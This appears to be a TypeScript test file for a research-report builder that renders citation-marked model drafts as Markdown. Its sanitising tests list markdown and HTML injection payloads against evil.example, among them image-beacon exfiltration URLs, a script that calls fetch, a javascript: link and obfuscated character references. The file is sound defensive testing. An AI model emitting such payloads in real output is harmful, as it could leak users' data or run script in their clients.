import { gfm } from 'micromark-extension-gfm';
import { gfmFromMarkdown } from 'mdast-util-gfm';
import { mathFromMarkdown } from 'mdast-util-math';
import { math } from 'micromark-extension-llm-math';
import { fromMarkdown } from 'mdast-util-from-markdown';
import { directive } from 'micromark-extension-directive';
import { directiveFromMarkdown } from 'mdast-util-directive';
import type { ISnapshot } from '../../src/db';
import { buildReport, buildFallbackDraft, sanitiseDraft } from '../../src/server/report';
import { parseCitedSentences } from '../../src/server/citations';

type MdNode = {
  type: string;
  url?: string;
  name?: string;
  lang?: string | null;
  value?: string;
  children?: MdNode[];
  position?: { start: { offset?: number }; end: { offset?: number } };
};

const snap = (id: string, overrides: Partial<ISnapshot> = {}): ISnapshot => ({
  id,
  sourceKind: 'web',
  reference: `r-${id}`,
  url: `https://example.com/${id}`,
  title: `Title ${id}`,
  storageKey: 'k',
  fileStrategy: 'local',
  contentHash: 'h',
  fetchedAt: new Date('2026-11-01T00:00:00.000Z'),
  archived: false,
  ...overrides,
});

describe('buildReport', () => {
  const draft = 'Fact one. [[cite:a]] Fact two. [[cite:b]] Fact three. [[cite:gone]]';

  it('puts the verification summary first and labels weak claims', () => {
    const report = buildReport({
      title: 'Current events: X',
      draft,
      sentenceStates: ['supported', 'unsupported', 'unavailable'],
      summary: { supported: 1, unsupported: 1, unavailable: 1, total: 3 },
      snapshots: [snap('a'), snap('b')],
      partial: false,
    });
    const lines = report.split('\n');
    expect(lines[0]).toBe('# Current events: X');
    expect(report.indexOf('**Verification:**')).toBeLessThan(report.indexOf('Fact one.'));
    expect(report).toContain('1 supported, 1 unverified, 1 source unavailable (3 citations)');
    expect(report).toContain('Fact one. [1]');
    expect(report).toContain('**[Unverified]** Fact two. [2]');
    expect(report).toContain('**[Source unavailable]** Fact three. [3]');
    expect(report).toContain('1. [Title a](https://example.com/a)');
    expect(report).toContain('3. Source unavailable (snapshot gone)');
    expect(report).not.toContain('[[cite:');
  });

  it('flags a partial report and includes scope notes', () => {
    const report = buildReport({
      title: 'T',
      draft: 'Fact. [[cite:a]]',
      sentenceStates: ['supported'],
      summary: { supported: 1, unsupported: 0, unavailable: 0, total: 1, scopeNotes: 'Drifted.' },
      notes: '2 citations were not checked.',
      snapshots: [snap('a')],
      partial: true,
    });
    expect(report).toContain('**Partial report:**');
    expect(report).toContain('## Scope notes');
    expect(report).toContain('Drifted.');
    expect(report).toContain('2 citations were not checked.');
  });

  it('describes a document source by its reference when it has no url', () => {
    const report = buildReport({
      title: 'T',
      draft: 'Fact. [[cite:d]]',
      sentenceStates: ['supported'],
      summary: { supported: 1, unsupported: 0, unavailable: 0, total: 1 },
      snapshots: [
        snap('d', { url: undefined, sourceKind: 'document', reference: 'site/drive/item#2' }),
      ],
      partial: false,
    });
    expect(report).toContain('1. Title d - site/drive/item#2');
  });
});

describe('buildReport uncited prose', () => {
  it('says in the summary how many sentences carry no citation', () => {
    const report = buildReport({
      title: 'T',
      draft: 'Fact one. [[cite:a]] Something from memory.',
      sentenceStates: ['supported'],
      summary: { supported: 1, unsupported: 0, unavailable: 0, total: 1, uncited: 3 },
      snapshots: [snap('a')],
      partial: false,
    });
    expect(report).toContain('3 sentences carry no citation');
    const clean = buildReport({
      title: 'T',
      draft: 'Fact one. [[cite:a]]',
      sentenceStates: ['supported'],
      summary: { supported: 1, unsupported: 0, unavailable: 0, total: 1 },
      snapshots: [snap('a')],
      partial: false,
    });
    expect(clean).not.toContain('carry no citation');
  });
});

describe('buildReport sanitising model output', () => {
  const ALLOWED_URL = 'https://example.com/a';

  /** Node types that load, link, execute or reinterpret text in the client's pipeline. */
  const LIVE_TYPES = [
    'image',
    'imageReference',
    'definition',
    'html',
    'linkReference',
    'textDirective',
    'leafDirective',
    'containerDirective',
    'math',
    'inlineMath',
  ];

  /**
   * Parses with the plugins the client's Markdown renderer uses (GFM, directives for
   * artifacts, and llm-math, which always parses \\[ \\] and \\( \\)), then lists every node
   * that is live. Links are allowed only to the cited source URL in the Sources list.
   */
  function liveNodes(markdown: string): string[] {
    const tree = fromMarkdown(markdown, {
      extensions: [gfm(), directive(), math()],
      mdastExtensions: [gfmFromMarkdown(), directiveFromMarkdown(), mathFromMarkdown()],
    });
    const found: string[] = [];
    const walk = (node: MdNode) => {
      if (LIVE_TYPES.includes(node.type)) {
        found.push(`${node.type}:${node.url ?? node.value ?? node.name ?? ''}`);
      }
      if (node.type === 'link' && node.url !== ALLOWED_URL) {
        found.push(`link:${node.url}`);
      }
      if (node.type === 'code' && node.lang) {
        found.push(`code:${node.lang}`);
      }
      node.children?.forEach(walk);
    };
    walk(tree as MdNode);
    return found;
  }

  const report = (draft: string, overrides: Partial<Parameters<typeof buildReport>[0]> = {}) =>
    buildReport({
      title: 'T',
      draft,
      sentenceStates: ['supported'],
      summary: { supported: 1, unsupported: 0, unavailable: 0, total: 1 },
      snapshots: [snap('a', { url: ALLOWED_URL })],
      partial: false,
      ...overrides,
    });

  const payloads = [
    'Fact ![chart](https://evil.example/x.png?q=secret). [[cite:a]]',
    'Fact \\![a](https://evil.example/esc.png). [[cite:a]]',
    'Fact \\[a](https://evil.example/esc-link). [[cite:a]]',
    'Fact ![a](<https://evil.example/x y.png>). [[cite:a]]',
    'Fact ![a [nested]](https://evil.example/n.png). [[cite:a]]',
    'Fact ![a][r]. [[cite:a]]\n\n[r]: https://evil.example/ref.png',
    'Fact. [[cite:a]]\n\n[a]: https://evil.example/def',
    'Fact <img src="https://evil.example/h.png"> here. [[cite:a]]',
    'Fact <https://evil.example/auto>. [[cite:a]]',
    'Fact [click](https://evil.example/l). [[cite:a]]',
    'Fact. [[cite:a]](https://evil.example/after-marker)',
    'Fact. [[cite:a]][x]\n\n[x]: https://evil.example/x',
    'Fact `![a](https://evil.example/code.png)` and more. [[cite:a]]',
    'Fact. [[cite:a]]\n\n:::artifact{identifier="x" type="text/html" title="t"}\n<script>fetch("https://evil.example")</script>\n:::',
    'Fact. [[cite:a]]\n\n::artifact{identifier="x"}',
    'Fact :abbr[x]{title="https://evil.example"} here. [[cite:a]]',
    'Visit https://evil.example/x or www.evil.example or mail a@evil.example. [[cite:a]]',
    'Fact. [[cite:a]]\n\n```mermaid\ngraph TD; A-->B\n```',
    'Fact. [[cite:a]]\n\n~~~html\n<b>x</b>\n~~~',
    'Fact \\[x^2\\] and \\(y\\). [[cite:a]]',
    'Fact \ue202turn0search0 here. [[cite:a]]',
    'Fact! [[cite:a]]',
    'Fact. [[cite:a]]: https://evil.example/def-after-marker',
    'Fact _https://evil.example/u and 1https://evil.example/d. [[cite:a]]',
    'Fact ~https://evil.example/t and xwww.evil.example and _www.evil.example. [[cite:a]]',
    'Fact. [[cite:a]]\n\n> ~~~html\n> <b>x</b>\n> ~~~',
    'Fact. [[cite:a]]\n\n- ~~~mermaid\n  graph TD;A-->B\n  ~~~',
    'Fact $$x^2$$ and $y$ here. [[cite:a]]',
    'Fact. [[cite:<img/src="https://evil.example/m">]]',
    'Fact. [[cite:a]] [[cite:x](https://evil.example/id)]]',
  ];

  it.each(payloads)('leaves nothing live in the rendered report: %s', (draft) => {
    expect(liveNodes(report(draft))).toEqual([]);
  });

  it('escapes model text that reaches the title and scope notes', () => {
    const rendered = report('Fact. [[cite:a]]', {
      title: 'T <img src="https://evil.example/t.png">',
      summary: {
        supported: 1,
        unsupported: 0,
        unavailable: 0,
        total: 1,
        scopeNotes: 'See ![x](https://evil.example/s.png)',
      },
    });
    expect(liveNodes(rendered)).toEqual([]);
  });

  it('escapes fetched page titles in the sources list', () => {
    const rendered = report('Fact. [[cite:a]]', {
      snapshots: [
        snap('a', {
          url: ALLOWED_URL,
          title: 'Evil](javascript:x) ![i](https://evil.example/p.png)',
        }),
      ],
    });
    expect(liveNodes(rendered)).toEqual([]);
    expect(rendered).toContain(`](${ALLOWED_URL})`);
  });

  it('keeps ordinary prose readable in the raw file', () => {
    const rendered = report('Note: prices rose 4% at 10:30 in Q3, a 3:1 ratio. [[cite:a]]');
    expect(rendered).toContain('Note: prices rose 4% at 10:30 in Q3, a 3:1 ratio. [1]');
  });

  it('escapes an unknown snapshot id in the sources list', () => {
    const rendered = report('Fact. [[cite:a]] Other. [[cite:missing_1]]', {
      sentenceStates: ['supported', 'unavailable'],
    });
    expect(rendered).toContain('2. Source unavailable (snapshot missing_1)');
    expect(liveNodes(rendered)).toEqual([]);
  });

  it('renders code as literal backticks rather than code spans', () => {
    expect(report('Use `getUser` here. [[cite:a]]')).toContain('Use &#96;getUser&#96; here. [1]');
  });

  it('keeps urls readable while stopping them becoming links', () => {
    const rendered = report('See https://example.org/x for more. [[cite:a]]');
    expect(rendered.replace(/\u2060/g, '')).toContain('See https://example.org/x for more. [1]');
    expect(liveNodes(rendered)).toEqual([]);
  });

  it('re-encodes character references the model wrote itself', () => {
    const rendered = report('Fact h&#116;tps&colon;//evil.example &#xE202; here. [[cite:a]]');
    expect(liveNodes(rendered)).toEqual([]);
    expect(rendered).toContain('&amp;colon;');
  });

  it('strips private-use characters the client treats as citation markers', () => {
    expect(report('Fact \ue202turn0search0 here. [[cite:a]]')).not.toMatch(/[\ue000-\uf8ff]/);
  });

  it('segments the sanitised draft the same way the report does', () => {
    const raw = 'A ![x](https://e.example/i.png) b. [[cite:a]] <b>c</b>. [[cite:a]]';
    expect(parseCitedSentences(sanitiseDraft(raw))).toHaveLength(2);
  });
});

describe('buildFallbackDraft', () => {
  it('lists notes as cited findings', () => {
    const draft = buildFallbackDraft([
      { claim: 'X grew', snapshotId: 's1', locator: 'p2' },
      { claim: 'Y shrank', snapshotId: 's2' },
    ]);
    expect(draft).toContain('- X grew [[cite:s1#p2]]');
    expect(draft).toContain('- Y shrank [[cite:s2]]');
  });

  it('says plainly when nothing was gathered', () => {
    expect(buildFallbackDraft([])).toContain('No sources were gathered');
  });
});
